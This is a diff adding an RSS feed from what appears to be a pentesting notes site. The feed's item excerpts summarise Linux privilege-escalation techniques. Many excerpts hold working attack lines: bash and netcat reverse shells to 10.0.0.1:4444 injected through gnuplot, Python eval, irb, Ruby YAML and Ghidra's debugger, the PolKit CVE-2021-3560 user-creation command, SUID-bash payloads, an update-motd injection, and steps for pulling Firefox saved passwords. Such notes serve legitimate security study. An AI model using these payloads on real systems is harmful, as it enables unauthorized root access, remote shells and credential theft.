@@ -1,0 +1,187 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Privilege Escalation on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/</link>
+    <description>Recent content in Privilege Escalation on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:38:09 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Sudo Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/</guid>
+      <description>GTFOBins linkGTFOBins provides a wide variety of payloads to privilege escalation.&#xA;So it&amp;rsquo;s recommended to look for in there.&#xA;Investigation linkVersion link sudo --version If the sudo version &amp;lt;=1.28, try the following command.&#xA;sudo -u#-1 /bin/bash As Another Users link sudo su root sudo -u john whoami # -s: run shell as target user sudo -s List Privileges Commands linkWe may be able to see the commands available as another user.</description>
+    </item>
+    <item>
+      <title>Shared Library Hijacking</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</link>
+      <pubDate>Wed, 13 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</guid>
+      <description>Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file.&#xA;strings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell.&#xA;find / -type f -name &amp;#34;foo.so&amp;#34; 2&amp;gt;/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.</description>
+    </item>
+    <item>
+      <title>PolKit Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</link>
+      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</guid>
+      <description>CVE-2021-3560 link1. Send a dbus message to create a new user linkCreate a new user by sending a dbus message.&#xA;# string:tester: The new user named &amp;#34;tester&amp;#34;. # string:&amp;#34;Tester Account&amp;#34;: The description of the new user. # int32:1: sudo group dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:&amp;#34;Tester Account&amp;#34; int32:1 &amp;amp; sleep 0.005s; kill $! Then check the new user ID (uid).&#xA;id tester uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo) 2. Generate a new password hash link # -6: SHA512 openssl passwd -6 password123 Copy the output hash.</description>
+    </item>
+    <item>
+      <title>Buffer Overflow Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</link>
+      <pubDate>Wed, 05 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</guid>
+      <description>Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 link1. Check Vulnerability to Overwrite Heap Buffer in Target Machine link sudoedit -s &amp;#39;\&amp;#39; $(python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*1000)&amp;#39;) malloc(): invalid size (unsorted) Aborted 2. Proof of Concept linkThere are various PoC online.&#xA;https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156. https://github.com/blasty/CVE-2021-3156 Pwfeedback link1. Check Enabling the Pwfeedback in /etc/sudoers linkIf so, when running sudo command and inputting password, asterisk will be displayed.&#xA;You can make it the buffer overflow.&#xA;cat /etc/sudoers # ------------------------------------------- .</description>
+    </item>
+    <item>
+      <title>Rust Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</link>
+      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</guid>
+      <description>Reverse Shell linkReference: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs&#xA;We can create a binary or module to reverse shell.&#xA;cd /path/to/rust/project/src vim lib.rs (In vim editor, insert a reverse shell code into a file) cargo build </description>
+    </item>
+    <item>
+      <title>Gnuplot Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</link>
+      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</guid>
+      <description>Command Execution linkThe script file of gnuplot can be used to execute system commands as below.&#xA;gnuplot test.plt Contents of the .plt is like the following.&#xA;system &amp;#34;whoami&amp;#34; # Reverse shell system &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; </description>
+    </item>
+    <item>
+      <title>Pip Download Code Execution</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</link>
+      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</guid>
+      <description>Exploitation link1. Create Malicious Python Package linkReference: https://github.com/wunderwuzzi23/this_is_fine_wuzzi&#xA;Assume the package named &amp;ldquo;exploitpy&amp;rdquo;.&#xA;We need to create &amp;ldquo;setup.py&amp;rdquo; in the project root, and &amp;quot;init.py&amp;quot;, &amp;ldquo;main.py&amp;rdquo; in src directory.&#xA;mkdir exploitpy cd exploitpy touch setup.py mkdir src touch src/__init__.py echo &amp;#39;print(&amp;#34;hello&amp;#34;)&amp;#39; &amp;gt; src/main.py Below is the content of the &amp;ldquo;setup.py&amp;rdquo;.&#xA;The arbitrary code is injected in the “RunCommand” method. It is executed when pip download command.&#xA;# setup.py from setuptools import setup, find_packages from setuptools.</description>
+    </item>
+    <item>
+      <title>SSSD Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</link>
+      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</guid>
+      <description>Find Credentials link ls -la /var/lib/sss/ # Find credentials # If we find the hash, crack it using John or Hashcat. strings /var/lib/sss/db/example.ldb </description>
+    </item>
+    <item>
+      <title>Python Eval Code Execution</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</link>
+      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
+      <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
+    </item>
+    <item>
+      <title>Tar Wildcard Injection PrivEsc</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</link>
+      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</guid>
+      <description>Investigation linkFor example, below command can be executed as root.&#xA;sudo -l (root) NOPASSWD: /opt/backup/baskup.sh Check If the File Contains Tar Command with Wildcards linkWe need to check the content in the file.&#xA;cat /opt/backup/backup.sh # -cf: create an archived file tar -cf backup.tar * The above tar command means that it creates an arvhived file from any input file because it passes wildcard (*).&#xA;Exploitation linkNow create a payload for privilege escalation.</description>
+    </item>
+    <item>
+      <title>Ghidra Debug Mode RCE</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</link>
+      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</guid>
+      <description>Exploitation link jdb -attach 127.0.0.1:18001 &amp;gt; classpath &amp;gt; classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(&amp;#34;nc 10.0.0.1 4444 -e /bin/sh&amp;#34;) </description>
+    </item>
+    <item>
+      <title>Python Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</link>
+      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</guid>
+      <description>Sudo PrivEsc linkReplace with Arbitrary Script link sudo -l (root) NOPASSWD: /usr/bin/python3 /home/&amp;lt;username&amp;gt;/example.py If the python script is under the current user&amp;rsquo;s home directory, we can remove the script and create the new one with the same name.&#xA;rm -rf /home/&amp;lt;username&amp;gt;/example.py touch /home/&amp;lt;username&amp;gt;/example.py We can insert arbitrary code in the new script. For example,&#xA;import os;os.system(&amp;#39;/bin/bash&amp;#39;) Module Hijacking linkAssume the python script can be executed as root with SETENV,NOPASSWD.&#xA;For example,</description>
+    </item>
+    <item>
+      <title>irb (Interactive Ruby Shell) Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</guid>
+      <description>Exploitation link irb # #q!: Define a string literal &amp;gt; exec %q!whoami! &amp;gt; exec %q!cp /bin/bash /tmp/bash; chmod &amp;#43;s /tmp/bash! &amp;gt; exec %q!bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;! </description>
+    </item>
+    <item>
+      <title>Ruby Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</guid>
+      <description>Remote Code Execution with YAML linkCheck if the current user could run the ruby script as root privilege.&#xA;(root) NOPASSWD: /usr/bin/ruby sample.rb If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:&#xA;--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;amp;1 !ruby/object:Net::BufferedIO io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &amp;#34;abc&amp;#34; debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter socket: &amp;amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &amp;#39;Kernel&amp;#39; method_id: :system git_set: &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; method_id: :resolve Then start listener in local machine.</description>
+    </item>
+    <item>
+      <title>Python Jails Escape</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</link>
+      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</guid>
+      <description>If we faced the Python script as follow, we cannot use common modules used for escalating privileges (&amp;ldquo;os&amp;rdquo;, &amp;ldquo;system&amp;rdquo;, etc.).&#xA;It appeared in Newbie CTF 2019.&#xA;#! /usr/bin/python3 def main(): text = input(&amp;#39;&amp;gt;&amp;gt; &amp;#39;) for keyword in [&amp;#39;eval&amp;#39;, &amp;#39;exec&amp;#39;, &amp;#39;import&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;os&amp;#39;, &amp;#39;read&amp;#39;, &amp;#39;system&amp;#39;, &amp;#39;write&amp;#39;]: if keyword in text: print(&amp;#34;No!!!&amp;#34;) return else: exec(text) if __name__ == &amp;#34;__main__&amp;#34;: main() We need to modify module names to allow us to execute them.</description>
+    </item>
+    <item>
+      <title>Python Yaml Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</link>
+      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</guid>
+      <description>Investigation link import yaml filename = &amp;#34;example.yml&amp;#34; yaml.load() Payloads link import yaml from yaml import Loader, UnsafeLoader data = b&amp;#39;!!python/object/new:os.system [&amp;#34;cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u&amp;#43;sx /tmp/bash&amp;#34;]&amp;#39; yaml.load(data) yaml.load(data, Loader=Loader) yaml.load(data, Loader=UnsafeLoader) yaml.load_all(data) yaml.load_all(data, Loader=Loader) yaml.load_all(data, Loader=UnsafeLoader) yaml.unsafe_load(data) Now execute the bash in privilege mode.&#xA;/tmp/bash -p Reverse Shell linkStart a listener in local machine.&#xA;nc -lvnp 1234 Then execute Python script that contains the following YAML code as root.</description>
+    </item>
+    <item>
+      <title>Bash eq Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</link>
+      <pubDate>Thu, 16 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</guid>
+      <description>Investigation linkPlease see this post for details.&#xA;sudo -l (root) /bin/bash /opt/example.sh If we can execute above command as root, and the /opt/example.sh contains the numeric comparison such as [[ $var -eq 42 ]], we can execute arbitrary command.&#xA;#!/bin/bash read -rp &amp;#34;Enter guess: &amp;#34; num if [[ $num -eq 42 ]] then echo &amp;#34;Correct&amp;#34; else echo &amp;#34;Wrong&amp;#34; fi To execute arbitrary command, answer this question as below.&#xA;sudo /bin/bash /opt/example.</description>
+    </item>
+    <item>
+      <title>Ansible Playbook Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</link>
+      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</guid>
+      <description>PrivEsc with Tasks linkFirst off, check the content of playbook in /opt/ansible/playbooks.&#xA;For instance, a file named “httpd.yaml”.&#xA;- name: Install and configure Apache ... roles: - role: geerlingguy.apache tasks: - name: configure firewall firewalld: ... Next, check the content of configure files in /opt/ansible/roles/geerlingguy.apache/tasks.&#xA;And add the exploitable file in this.&#xA;For example, a file named “shell.yml”.&#xA;- hosts: localhost tasks: - name: RShell command: sudo bash /tmp/root.sh Create a exploit for reverse shell.</description>
+    </item>
+    <item>
+      <title>Chrome Remote Debugger Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</guid>
+      <description>Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.&#xA;Exploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.&#xA;ssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.&#xA;Open Chrome browser and input the following string in URL bar at the top of the window.</description>
+    </item>
+    <item>
+      <title>OpenSSL Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</link>
+      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</guid>
+      <description>Privilege Escalation (SUID) linkReference: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/&#xA;1. Get Capabilities linkChack capabilities in the target machine.&#xA;# -r: recursive getcap -r / 2&amp;gt;/dev/null If you see the openssl has the capability set as below, you can successfully exploit it.&#xA;/usr/bin/openssl = cap_setuid&amp;#43;ep 2. Create the Exploit in C linkIn local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.&#xA;If you don&amp;rsquo;t have it yet, install it.</description>
+    </item>
+    <item>
+      <title>Apache Conf Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</link>
+      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</guid>
+      <description>Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.&#xA;Exploitation link1. Update Apache.Conf linkFirst modify “apache.conf” file to change the web user with new one.&#xA;# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.</description>
+    </item>
+    <item>
+      <title>Doas Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</link>
+      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</guid>
+      <description>Investigation linkFirst of all, search location of doas.conf.&#xA;find / -type f -name &amp;#34;doas.conf&amp;#34; 2&amp;gt;/dev/null Next check the configuration.&#xA;doas -C /path/to/doas.conf doas -C /etc/doas.conf # or cat /etc/doas.conf Execute doas as below.&#xA;doas -u root &amp;lt;command&amp;gt; &amp;lt;arg&amp;gt; Please also refer to GTFOBins to PrivEsc.</description>
+    </item>
+    <item>
+      <title>Update-Motd Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</link>
+      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</guid>
+      <description>Investigation link ls -al /etc/update-motd.d/ If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.&#xA;Exploitation linkRun the following code to copy bash binary and give suid to this file.&#xA;Replace &amp;lt;username&amp;gt; with your current user name.&#xA;echo &amp;#34;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash &amp;amp;&amp;amp; chmod u&amp;#43;s /home/&amp;lt;username&amp;gt;/bash&amp;#34; &amp;gt;&amp;gt; /etc/update-motd.d/00-header After that, log out and log in again with SSH. The above script should be executed.</description>
+    </item>
+    <item>
+      <title>Snapd Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</guid>
+      <description>dirty_sock (CVE-2019-7304) Version &amp;lt; 2.37 linkReference: https://www.exploit-db.com/exploits/46361</description>
+    </item>
+    <item>
+      <title>Mozilla Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</link>
+      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</guid>
+      <description>Extract Passwords from Firefox Profile link1. Transfer the .firefox Directory link Zip&#xA;First, zip .firefox directory in target machine, and open web server to transfer the zip file to local machine.&#xA;zip -r /tmp/firefox.zip .firefox cd /tmp python3 -m http.server 8000 In local machine, download the zip file from the remote machine, and decompress it.&#xA;wget http://&amp;lt;target-ip&amp;gt;:8000/mozilla.zip unzip mozilla.zip Tar&#xA;If we cannot use zip, tar also can be used.</description>
+    </item>
+  </channel>
+</rss>
